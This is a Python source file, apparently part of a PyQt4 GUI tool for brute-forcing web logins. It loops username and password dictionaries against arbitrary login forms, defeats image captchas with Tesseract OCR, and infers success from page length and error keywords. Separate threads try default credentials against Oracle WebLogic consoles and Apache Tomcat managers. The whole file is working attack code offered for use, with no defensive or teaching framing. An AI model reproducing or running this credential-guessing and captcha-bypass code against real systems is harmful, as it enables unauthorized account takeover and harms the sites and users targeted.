import re
import traceback
from urllib.parse import urlparse
from PyQt4 import QtCore
import threading
from PIL import Image
from bs4 import BeautifulSoup
import datetime
from pytesseract import image_to_string
import requests


class PostResponseWrapper():

   def __init__(self,username,password,pagelength=None,result=None,url=None):
        self.username = username
        self.password = password
        self.pagelength = str(pagelength)
        self.result = str(result)
        self.url = url


class FormDataWarapper():

    def __init__(self,dataWrapper):
        # self.url = form_url.url
        self.headers = dataWrapper.header
        self.post_url = dataWrapper.posturl
        self.hasCaptcha = dataWrapper.hasCaptcha
        self.captcha_url = dataWrapper.captcha_url
        self.maindata = dataWrapper.postdata.maindata
        self.extradata = dataWrapper.postdata.extradata
        self.url = dataWrapper.url

class MyLoginThread(QtCore.QThread):

    errortextlength = set()
    successtextlength = set()

    trigger = QtCore.pyqtSignal(PostResponseWrapper)
    finished = QtCore.pyqtSignal()
    processing = QtCore.pyqtSignal()

    def __init__(self,usernamedict,pwddict,dataWrapper):
        super(MyLoginThread, self).__init__()
        self.usernamedict = usernamedict
        self.pwddict = pwddict
        self.formdata = FormDataWarapper(dataWrapper)

    def run(self):
        self.__first_login()
        for username in self.usernamedict:
            for password in self.pwddict:
                result,responsedata= self.__post_form(username,password)
                self.processing.emit()
                if result:
                    self.trigger.emit(responsedata)
        self.finished.emit()

    def __first_login(self):
        postdata = {}
        postdata[self.formdata.maindata['username']] = 'wyj@163.com'
        postdata[self.formdata.maindata['password']] = 'wyj'
        #如果存在验证码
        if self.formdata.hasCaptcha:
            errorpageLength = self.__post_data_with_captcha(postdata,self.formdata.captcha_url)
            self.errortextlength.add(errorpageLength)
        else:
            errorpageLength = self.__post_data_without_captcha(postdata)
            self.errortextlength.add(errorpageLength)


    def __post_data(self,postdata):
        session = requests.session()
        try:
            postresponse = session.post(self.formdata.post_url,data=postdata,headers=self.formdata.headers,timeout=2)
        except:
            return 0
        responseHtml = postresponse.text
        pageLength = len(responseHtml)
        return pageLength

    def __post_data_with_captcha(self,postdata,captchaurl):
        session = requests.session()
        response = session.get(captchaurl)
        imagedata = response.content
        time = datetime.datetime.now().time()
        f = open('image.jpg','wb')
        f.write(imagedata)
        f.close()
        #decode the captcha
        try:
            imgstr =image_to_string(Image.open('image.jpg'))
            print(imgstr)
            postdata[self.formdata.maindata['captcha']] = imgstr
        except UnicodeDecodeError:
            pass
        postdata.update(self.formdata.extradata)
        postresponse = session.post(self.formdata.post_url,data=postdata,headers=self.formdata.headers)
        responseHtml = postresponse.text
        pageLength = len(responseHtml)
        return pageLength

    def __post_data_without_captcha(self,postdata):
        session = requests.session()
        contents = session.get(self.formdata.url,headers=self.formdata.headers,timeout=3)
        print('页面url为：',self.formdata.url)
        # print('网页源代码为,',contents.text)
        contents_soup = BeautifulSoup(contents.text)
        extradata = {}
        print('maindata',self.formdata.maindata)
        print('extradata',self.formdata.extradata)
        for key in self.formdata.extradata:
            try:
                value = contents_soup.find("input",{"name":key})["value"]
                extradata[key] = value
            except:
                extradata[key] = ''
        print(extradata)
        # postdata.update(extradata)
        extradata.update(postdata)
        postdata = extradata
        print('最终提交参数',postdata)
        # postdata.update(self.formdata.extradata)
        # print(postdata)
        postresponse = session.post(self.formdata.post_url,data=postdata,headers=self.formdata.headers)
        responseHtml = postresponse.text
        print(responseHtml)
        pageLength = len(responseHtml)
        return pageLength

    def __post_form(self,username,pwd):
        postdata = {}
        postdata[self.formdata.maindata['username']] = username
        postdata[self.formdata.maindata['password']] = pwd
        session = requests.session()
        if self.formdata.hasCaptcha:
            captcha_decode = False
            while not captcha_decode:
                response = session.get(self.formdata.captcha_url)
                imagedata = response.content
                f = open('image.jpg','wb')
                f.write(imagedata)
                f.close()
                try:
                    imgstr =image_to_string(Image.open('image.jpg'))
                    print(imgstr)
                    m = re.match('[a-zA-Z0-9]+',imgstr)
                    #验证码识别成功，则停止识别
                    if m:
                        postdata[self.formdata.maindata['captcha']] = imgstr
                    #如果不是字母和数字，则重新识别
                    else:
                        continue
                except UnicodeDecodeError:
                    continue

                postresponse = self.__post_form_with_data(session,postdata)

                if not postresponse:
                    return False,PostResponseWrapper(username,pwd,None,False,self.formdata.post_url)

                responseHtml = postresponse.text
                captcha_pattern  ='正确(地)?验证码|验证码输入错误|重新输入验证码|验证码错误|验证码不正确|验证码输入不正确'
                compile_pattern = re.compile(captcha_pattern)
                match = compile_pattern.search(responseHtml)

                #验证码识别正确
                if  not match:
                    loginresult = self.__judeg_login_success(postresponse)
                    pagelen = len(responseHtml)
                    return loginresult,PostResponseWrapper(username,pwd,pagelen,loginresult,self.formdata.post_url)

        else:
            postresponse = self.__post_form_with_data(session,postdata)
            if not postresponse:
                return False,PostResponseWrapper(username,pwd,None,False,self.formdata.post_url)

            responseHtml = postresponse.text
            loginresult = self.__judeg_login_success(postresponse)
            pagelen = len(responseHtml)
            return loginresult,PostResponseWrapper(username,pwd,pagelen,loginresult,self.formdata.post_url)



    def __post_form_with_data(self,session,postdata):
        contents = session.get(self.formdata.url,headers=self.formdata.headers,timeout=3)
        contents_soup = BeautifulSoup(contents.text)
        extradata = {}
        for key in self.formdata.extradata:
            try:
                value = contents_soup.find("input",{"name":key})["value"]
                extradata[key] = value
            except:
                extradata[key] = ''
        extradata.update(postdata)
        postdata = extradata
        print('最终提交参数',postdata)
        postresposne = None
        try:
            postresponse = session.post(self.formdata.post_url,data=postdata,headers=self.formdata.headers,timeout=5)
        except:
            traceback.print_exc()
            # datetime.time.sleep(3)
            # return False,PostResponseWrapper(username,pwd,None,False,self.formdata.post_url)
        responseHtml = postresponse.text
        return postresponse

    def __judeg_login_success(self,postresponse):
        responseHtml = postresponse.text
        pagelen = len(responseHtml)
        loginresult = False
        print(responseHtml)
        #if the html redirect
        if not len(postresponse.history)==0:
            history = postresponse.history[0].status_code
            if history==302:
                if pagelen in self.errortextlength:
                    print("登陆失败，页面没有变化")
                    loginresult = False
                else:
                    if self.__error_login_page(responseHtml):
                        print("跳转之后，登录失败",len(responseHtml))
                        self.errortextlength.add(len(responseHtml))
                    else:
                        print("登录成功，页面变化",len(responseHtml))
                        loginresult = True
                        self.successtextlength.add(len(responseHtml))
        else:
            textlength = len(responseHtml)
            print(textlength)
            print(self.errortextlength)
            if self.__error_login_page(responseHtml):
                self.errortextlength.add(textlength)
                print("登录失败,error",textlength)
            elif textlength in self.errortextlength:
                print("登录失败",textlength)
            elif textlength in self.successtextlength:
                print("登录成功",textlength)
            else:
                print('返回值为:',postresponse.status_code)
                loginresult = True
        return loginresult


    def __error_login_page(self,html):
        pattern = "无效|错误|不存在|不正确|重新|填写|验证码|输入"
        re_error_pattern = re.compile(pattern)
        flags = re.findall(re_error_pattern,html)
        if(len(flags)>0):
            #判断是否要求输入验证码的情况
            # self.change_form_decode(html)
            return True
        else:
            return False


class QWebLogicThread(QtCore.QThread):

    trigger = QtCore.pyqtSignal(PostResponseWrapper)
    finished = QtCore.pyqtSignal()

    usernamelist = ['weblogic','123']
    pwdlist = ['weblogic123456','dadadaddada']

    def __init__(self,url):
        super(QWebLogicThread, self).__init__()
        self.url = url
        self.post_url = self.__get_post_url(url)


    def __get_post_url(self,url):
        urlformat = urlparse(url)
        post_url = urlformat.scheme+"://"+urlformat.netloc+'/console/j_security_check'
        return post_url

    def run(self):
        for username in self.usernamelist:
            for pwd in self.pwdlist:
                result,responseinfo  = self.__login_weblogic(username,pwd)
                if result:
                    self.trigger.emit(responseinfo)
        self.finished.emit()

    def __login_weblogic(self,username,pwd):
        #if cookie is exist
        cookie = self.__getcookie()
        # if cookie:
        headers = {
            'Content-Type':'application/x-www-form-urlencoded',
            'Connection':'Keep-Alive',
            'Cookie':cookie
        }
        payload = {
            'j_username':username,
            'j_password':pwd
        }
        response = requests.post(url=self.post_url,data=payload,headers=headers)
        response_text = response.text
        if not re.search('login',response_text):
            return (True,PostResponseWrapper(username=username,password=pwd,url=self.url))
        else:
            return (False,PostResponseWrapper(username=username,password=pwd,url=self.url))


    def __getcookie(self):
        response = requests.get(self.url)
        headers = response.headers
        pattern = re.compile('ADMINCONSOLESESSION=(.*);')
        match = pattern.search(str(headers))

        if match:
            cookie = match.group()
        else:
            return

class QTomcatThread(QtCore.QThread):

    trigger = QtCore.pyqtSignal(PostResponseWrapper)
    finished = QtCore.pyqtSignal()
    usernamelist = ['tomcat','roles']
    pwdlist = ['s3cret','tomcat']

    def __init__(self,url):
        super(QTomcatThread, self).__init__()
        self.url = url

    def run(self):
        for username in self.usernamelist:
            for pwd in self.pwdlist:
                result,responseinfo = self.__login_tomcat_manager(username,pwd)
                if result:
                    self.trigger.emit(responseinfo)
        self.finished.emit()

    def __login_tomcat_manager(self,username,pwd):
        try:
            response = requests.get(self.url,auth=(username,pwd),timeout=3)
            if response.status_code == 200:
                return (True,PostResponseWrapper(username,pwd,None,None,self.url))
            else:
                return (False,PostResponseWrapper(username,pwd,None,None,self.url))
        except Exception as e:
            print(str(e))
            return (False,PostResponseWrapper(username,pwd,None,None,self.url))


if __name__ == '__main__':
    pass